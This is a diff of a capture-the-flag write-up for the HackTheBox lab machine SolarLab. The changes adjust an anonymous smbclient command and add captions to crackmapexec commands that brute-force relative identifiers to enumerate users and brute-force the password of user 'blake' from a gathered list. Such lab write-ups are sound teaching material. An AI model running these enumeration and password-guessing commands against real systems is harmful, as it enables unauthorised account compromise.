@@ -61,7 +61,7 @@ report.solarlab.htb:6791
 
 ### SMB
 
-smbclient  //10.10.11.16/Documents -U anonymous
+    smbclient  //10.10.11.16/Documents -U anonymous
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/73f52f42-4035-4091-8dbc-d750b3b036f2)
 
@@ -69,9 +69,13 @@ details-file.xlsx
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/b3e48d13-4d07-4956-a086-5aa183493eef)
 
+Brute force the Relative Identifiers
+
     crackmapexec smb solarlab.htb -u anonymous -p '' --rid-brute
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/2e1e42d1-c198-4a03-82c5-5161a79c2b18)
+
+Brute force `Blake`'s password using the obtained passwords
 
     crackmapexec smb solarlab.htb -u blake -p pass.txt
 
